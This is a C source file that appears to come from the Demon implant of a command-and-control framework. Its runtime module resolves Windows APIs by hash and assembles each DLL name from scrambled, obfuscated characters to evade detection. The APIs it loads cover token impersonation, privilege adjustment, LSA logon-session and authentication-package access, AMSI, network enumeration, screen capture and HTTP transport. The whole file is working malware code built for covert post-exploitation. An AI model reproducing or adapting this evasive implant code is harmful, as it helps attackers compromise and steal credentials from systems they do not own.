#include <Demon.h>
#include <core/Runtime.h>
#include <core/MiniStd.h>


BOOL RtAdvapi32(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 0  ] = HideChar('A');
    ModuleName[ 2  ] = HideChar('V');
    ModuleName[ 11 ] = HideChar('L');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 3  ] = HideChar('A');
    ModuleName[ 8  ] = HideChar('.');
    ModuleName[ 12 ] = HideChar('\0');
    ModuleName[ 6  ] = HideChar('3');
    ModuleName[ 7  ] = HideChar('2');
    ModuleName[ 1  ] = HideChar('D');
    ModuleName[ 9  ] = HideChar('D');
    ModuleName[ 5  ] = HideChar('I');
    ModuleName[ 4  ] = HideChar('P');

    if ( ( Instance->Modules.Advapi32 = LoaderModLod( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance->Win32.GetTokenInformation          = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_GETTOKENINFORMATION );
        Instance->Win32.CreateProcessWithTokenW      = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_CREATEPROCESSWITHTOKENW );
        Instance->Win32.CreateProcessWithLogonW      = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_CREATEPROCESSWITHLOGONW );
        Instance->Win32.RevertToSelf                 = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_REVERTTOSELF );
        Instance->Win32.GetUserNameA                 = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_GETUSERNAMEA );
        Instance->Win32.LogonUserW                   = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_LOGONUSERW );
        Instance->Win32.LookupPrivilegeValueA        = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGEVALUEA );
        Instance->Win32.LookupAccountSidA            = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_LOOKUPACCOUNTSIDA );
        Instance->Win32.LookupAccountSidW            = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_LOOKUPACCOUNTSIDW );
        Instance->Win32.OpenThreadToken              = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_OPENTHREADTOKEN );
        Instance->Win32.OpenProcessToken             = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_OPENPROCESSTOKEN );
        Instance->Win32.AdjustTokenPrivileges        = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_ADJUSTTOKENPRIVILEGES );
        Instance->Win32.LookupPrivilegeNameA         = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGENAMEA );
        Instance->Win32.SystemFunction032            = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_SYSTEMFUNCTION032 );
        Instance->Win32.FreeSid                      = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_FREESID );
        Instance->Win32.SetSecurityDescriptorSacl    = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORSACL );
        Instance->Win32.SetSecurityDescriptorDacl    = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORDACL );
        Instance->Win32.InitializeSecurityDescriptor = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_INITIALIZESECURITYDESCRIPTOR );
        Instance->Win32.AddMandatoryAce              = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_ADDMANDATORYACE );
        Instance->Win32.InitializeAcl                = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_INITIALIZEACL );
        Instance->Win32.AllocateAndInitializeSid     = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_ALLOCATEANDINITIALIZESID );
        Instance->Win32.CheckTokenMembership         = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_CHECKTOKENMEMBERSHIP );
        Instance->Win32.SetEntriesInAclW             = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_SETENTRIESINACLW );
        Instance->Win32.SetThreadToken               = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_SETTHREADTOKEN );
        Instance->Win32.LsaNtStatusToWinError        = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_LSANTSTATUSTOWINERROR );
        Instance->Win32.EqualSid                     = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_EQUALSID );
        Instance->Win32.ConvertSidToStringSidW       = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_CONVERTSIDTOSTRINGSIDW );
        Instance->Win32.GetSidSubAuthorityCount      = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITYCOUNT );
        Instance->Win32.GetSidSubAuthority           = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITY );

        PUTS( "Loaded Advapi32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Advapi32" )
        return FALSE;
    }

    return TRUE;
}

// we delay loading mscoree.dll
BOOL RtMscoree(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    if ( Instance->Win32.CLRCreateInstance )
        return TRUE;

    ModuleName[ 1  ] = HideChar('S');
    ModuleName[ 2  ] = HideChar('C');
    ModuleName[ 11 ] = HideChar(0);
    ModuleName[ 0  ] = HideChar('M');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 8  ] = HideChar('D');
    ModuleName[ 7  ] = HideChar('.');
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 5  ] = HideChar('E');
    ModuleName[ 4  ] = HideChar('R');
    ModuleName[ 6  ] = HideChar('E');
    ModuleName[ 3  ] = HideChar('O');

    if ( ( Instance->Modules.Mscoree = LoaderModLod( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance->Win32.CLRCreateInstance = LoaderFuncAdd( Instance->Modules.Mscoree, H_FUNC_CLRCREATEINSTANCE );

        PUTS( "Loaded Mscoree functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Mscoree" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtOleaut32(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 3  ] = HideChar('A');
    ModuleName[ 2  ] = HideChar('E');
    ModuleName[ 0  ] = HideChar('O');
    ModuleName[ 1  ] = HideChar('L');
    ModuleName[ 5  ] = HideChar('T');
    ModuleName[ 11 ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('2');
    ModuleName[ 6  ] = HideChar('3');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 12 ] = HideChar(0);
    ModuleName[ 4  ] = HideChar('U');
    ModuleName[ 9  ] = HideChar('D');
    ModuleName[ 8  ] = HideChar('.');

    if ( ( Instance->Modules.Oleaut32 = LoaderModLod( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance->Win32.SafeArrayAccessData   = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYACCESSDATA );
        Instance->Win32.SafeArrayUnaccessData = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYUNACCESSDATA );
        Instance->Win32.SafeArrayCreate       = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYCREATE );
        Instance->Win32.SafeArrayPutElement   = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYPUTELEMENT );
        Instance->Win32.SafeArrayCreateVector = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYCREATEVECTOR );
        Instance->Win32.SafeArrayDestroy      = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYDESTROY );
        Instance->Win32.SysAllocString        = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SYSALLOCSTRING );

        PUTS( "Loaded Oleaut32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Oleaut32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtUser32(
    VOID
) {
    CHAR ModuleName[ 11 ] = { 0 };

    ModuleName[ 1  ] = HideChar('S');
    ModuleName[ 0  ] = HideChar('U');
    ModuleName[ 10 ] = HideChar(0);
    ModuleName[ 6  ] = HideChar('.');
    ModuleName[ 8  ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('D');
    ModuleName[ 5  ] = HideChar('2');
    ModuleName[ 3  ] = HideChar('R');
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 2  ] = HideChar('E');
    ModuleName[ 4  ] = HideChar('3');

    if ( ( Instance->Modules.User32 = LoaderModLod( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance->Win32.ShowWindow       = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_SHOWWINDOW );
        Instance->Win32.GetSystemMetrics = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_GETSYSTEMMETRICS );
        Instance->Win32.GetDC            = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_GETDC );
        Instance->Win32.ReleaseDC        = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_RELEASEDC );

        PUTS( "Loaded User32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load User32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtShell32(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 0  ] = HideChar('S');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('.');
    ModuleName[ 6  ] = HideChar('2');
    ModuleName[ 8  ] = HideChar('D');
    ModuleName[ 4  ] = HideChar('L');
    ModuleName[ 1  ] = HideChar('H');
    ModuleName[ 11 ] = HideChar(0);
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 5  ] = HideChar('3');
    ModuleName[ 3  ] = HideChar('L');
    ModuleName[ 2  ] = HideChar('E');

    if ( ( Instance->Modules.Shell32 = LoaderModLod( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance->Win32.CommandLineToArgvW = LoaderFuncAdd( Instance->Modules.Shell32, H_FUNC_COMMANDLINETOARGVW );

        PUTS( "Loaded Shell32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Shell32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtMsvcrt(
    VOID
) {
    CHAR ModuleName[ 11 ] = { 0 };

    ModuleName[ 0  ] = HideChar('M');
    ModuleName[ 6  ] = HideChar('.');
    ModuleName[ 10 ] = HideChar(0);
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 4  ] = HideChar('R');
    ModuleName[ 2  ] = HideChar('V');
    ModuleName[ 8  ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('D');
    ModuleName[ 3  ] = HideChar('C');
    ModuleName[ 5  ] = HideChar('T');
    ModuleName[ 1  ] = HideChar('S');

    if ( ( Instance->Modules.Msvcrt = LoaderModLod( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance->Win32.vsnprintf  = LoaderFuncAdd( Instance->Modules.Msvcrt, H_FUNC_VSNPRINTF );
        Instance->Win32.swprintf_s = LoaderFuncAdd( Instance->Modules.Msvcrt, H_FUNC_SWPRINTF_S );

        PUTS( "Loaded Msvcrt functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Msvcrt" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtIphlpapi(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 8  ] = HideChar('.');
    ModuleName[ 0  ] = HideChar('I');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 2  ] = HideChar('H');
    ModuleName[ 9  ] = HideChar('D');
    ModuleName[ 6  ] = HideChar('P');
    ModuleName[ 11 ] = HideChar('L');
    ModuleName[ 1  ] = HideChar('P');
    ModuleName[ 3  ] = HideChar('L');
    ModuleName[ 12 ] = HideChar(0);
    ModuleName[ 5  ] = HideChar('A');
    ModuleName[ 4  ] = HideChar('P');
    ModuleName[ 7  ] = HideChar('I');

    if ( ( Instance->Modules.Iphlpapi = LoaderModLod( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance->Win32.GetAdaptersInfo = LoaderFuncAdd( Instance->Modules.Iphlpapi, H_FUNC_GETADAPTERSINFO );

        PUTS( "Loaded Iphlpapi functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Iphlpapi" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtGdi32(
    VOID
) {
    CHAR ModuleName[ 10 ] = { 0 };

    ModuleName[ 4 ] = HideChar('2');
    ModuleName[ 6 ] = HideChar('D');
    ModuleName[ 5 ] = HideChar('.');
    ModuleName[ 8 ] = HideChar('L');
    ModuleName[ 2 ] = HideChar('I');
    ModuleName[ 1 ] = HideChar('D');
    ModuleName[ 7 ] = HideChar('L');
    ModuleName[ 9 ] = HideChar(0);
    ModuleName[ 0 ] = HideChar('G');
    ModuleName[ 3 ] = HideChar('3');

    if ( ( Instance->Modules.Gdi32 = LoaderModLod( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance->Win32.GetCurrentObject   = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_GETCURRENTOBJECT );
        Instance->Win32.GetObjectW         = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_GETOBJECTW );
        Instance->Win32.CreateCompatibleDC = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_CREATECOMPATIBLEDC );
        Instance->Win32.CreateDIBSection   = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_CREATEDIBSECTION );
        Instance->Win32.SelectObject       = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_SELECTOBJECT );
        Instance->Win32.BitBlt             = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_BITBLT );
        Instance->Win32.DeleteObject       = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_DELETEOBJECT );
        Instance->Win32.DeleteDC           = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_DELETEDC );

        PUTS( "Loaded Gdi32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Gdi32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtNetApi32(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 0  ] = HideChar('N');
    ModuleName[ 11 ] = HideChar('L');
    ModuleName[ 8  ] = HideChar('.');
    ModuleName[ 9  ] = HideChar('D');
    ModuleName[ 6  ] = HideChar('3');
    ModuleName[ 2  ] = HideChar('T');
    ModuleName[ 3  ] = HideChar('A');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 12 ] = HideChar(0);
    ModuleName[ 4  ] = HideChar('P');
    ModuleName[ 5  ] = HideChar('I');
    ModuleName[ 1  ] = HideChar('E');
    ModuleName[ 7  ] = HideChar('2');

    if ( ( Instance->Modules.NetApi32 = LoaderModLod( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance->Win32.NetLocalGroupEnum = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETLOCALGROUPENUM );
        Instance->Win32.NetGroupEnum      = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETGROUPENUM );
        Instance->Win32.NetUserEnum       = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETUSERENUM );
        Instance->Win32.NetWkstaUserEnum  = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETWKSTAUSERENUM );
        Instance->Win32.NetSessionEnum    = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETSESSIONENUM );
        Instance->Win32.NetShareEnum      = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETSHAREENUM );
        Instance->Win32.NetApiBufferFree  = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETAPIBUFFERFREE );

        PUTS( "Loaded NetApi32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load NetApi32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtWs2_32(
    VOID
) {
    CHAR ModuleName[ 11 ] = { 0 };

    ModuleName[ 0  ] = HideChar('W');
    ModuleName[ 2  ] = HideChar('2');
    ModuleName[ 4  ] = HideChar('3');
    ModuleName[ 6  ] = HideChar('.');
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 1  ] = HideChar('S');
    ModuleName[ 3  ] = HideChar('_');
    ModuleName[ 5  ] = HideChar('2');
    ModuleName[ 10 ] = HideChar(0);
    ModuleName[ 8  ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('D');

    if ( ( Instance->Modules.Ws2_32 = LoaderModLod( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance->Win32.WSAStartup      = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_WSASTARTUP );
        Instance->Win32.WSACleanup      = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_WSACLEANUP );
        Instance->Win32.WSASocketA      = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_WSASOCKETA );
        Instance->Win32.WSAGetLastError = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_WSAGETLASTERROR );
        Instance->Win32.ioctlsocket     = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_IOCTLSOCKET );
        Instance->Win32.bind            = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_BIND );
        Instance->Win32.listen          = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_LISTEN );
        Instance->Win32.accept          = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_ACCEPT );
        Instance->Win32.closesocket     = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_CLOSESOCKET );
        Instance->Win32.recv            = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_RECV );
        Instance->Win32.send            = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_SEND );
        Instance->Win32.connect         = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_CONNECT );
        Instance->Win32.getaddrinfo     = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_GETADDRINFO );
        Instance->Win32.freeaddrinfo    = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_FREEADDRINFO );

        PUTS( "Loaded Ws2_32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Ws2_32" )
        return FALSE;
    }

    return TRUE;
}


BOOL RtSspicli(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 0  ] = HideChar('S');
    ModuleName[ 11 ] = HideChar(0);
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 1  ] = HideChar('S');
    ModuleName[ 6  ] = HideChar('I');
    ModuleName[ 7  ] = HideChar('.');
    ModuleName[ 5  ] = HideChar('L');
    ModuleName[ 8  ] = HideChar('D');
    ModuleName[ 2  ] = HideChar('P');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 4  ] = HideChar('C');
    ModuleName[ 3  ] = HideChar('I');

    if ( ( Instance->Modules.Sspicli = LoaderModLod( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance->Win32.LsaRegisterLogonProcess        = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSAREGISTERLOGONPROCESS );
        Instance->Win32.LsaLookupAuthenticationPackage = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSALOOKUPAUTHENTICATIONPACKAGE );
        Instance->Win32.LsaDeregisterLogonProcess      = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSADEREGISTERLOGONPROCESS );
        Instance->Win32.LsaConnectUntrusted            = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSACONNECTUNTRUSTED );
        Instance->Win32.LsaFreeReturnBuffer            = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSAFREERETURNBUFFER );
        Instance->Win32.LsaCallAuthenticationPackage   = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSACALLAUTHENTICATIONPACKAGE );
        Instance->Win32.LsaGetLogonSessionData         = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSAGETLOGONSESSIONDATA );
        Instance->Win32.LsaEnumerateLogonSessions      = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSAENUMERATELOGONSESSIONS );

        PUTS( "Loaded Sspicli functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Sspicli" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtAmsi(
    VOID
) {
    CHAR ModuleName[ 9 ] = { 0 };

    ModuleName[ 3 ] = HideChar('I');
    ModuleName[ 5 ] = HideChar('D');
    ModuleName[ 7 ] = HideChar('L');
    ModuleName[ 8 ] = HideChar(0);
    ModuleName[ 6 ] = HideChar('L');
    ModuleName[ 4 ] = HideChar('.');
    ModuleName[ 0 ] = HideChar('A');
    ModuleName[ 1 ] = HideChar('M');
    ModuleName[ 2 ] = HideChar('S');

    if ( ( Instance->Modules.Amsi = LoaderModLod( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance->Win32.AmsiScanBuffer = LoaderFuncAdd( Instance->Modules.Amsi, H_FUNC_AMSISCANBUFFER );

        PUTS( "Loaded Amsi functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Amsi" )
        return FALSE;
    }

    return TRUE;
}

#ifdef TRANSPORT_HTTP
BOOL RtWinHttp(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 0  ] = HideChar('W');
    ModuleName[ 2  ] = HideChar('N');
    ModuleName[ 7  ] = HideChar('.');
    ModuleName[ 11 ] = HideChar(0);
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 4  ] = HideChar('T');
    ModuleName[ 8  ] = HideChar('D');
    ModuleName[ 1  ] = HideChar('I');
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 6  ] = HideChar('P');
    ModuleName[ 3  ] = HideChar('H');
    ModuleName[ 5  ] = HideChar('T');

    if ( ( Instance->Modules.WinHttp = LoaderModLod( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance->Win32.WinHttpOpen                           = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPOPEN );
        Instance->Win32.WinHttpConnect                        = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPCONNECT );
        Instance->Win32.WinHttpOpenRequest                    = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPOPENREQUEST );
        Instance->Win32.WinHttpSetOption                      = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPSETOPTION );
        Instance->Win32.WinHttpCloseHandle                    = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPCLOSEHANDLE );
        Instance->Win32.WinHttpSendRequest                    = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPSENDREQUEST );
        Instance->Win32.WinHttpAddRequestHeaders              = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPADDREQUESTHEADERS );
        Instance->Win32.WinHttpReceiveResponse                = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPRECEIVERESPONSE );
        Instance->Win32.WinHttpReadData                       = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPREADDATA );
        Instance->Win32.WinHttpQueryHeaders                   = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPQUERYHEADERS );
        Instance->Win32.WinHttpGetIEProxyConfigForCurrentUser = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPGETIEPROXYCONFIGFORCURRENTUSER );
        Instance->Win32.WinHttpGetProxyForUrl                 = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPGETPROXYFORURL );

        PUTS( "Loaded WinHttp functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load WinHttp" )
        return FALSE;
    }

    return TRUE;
}
#endif
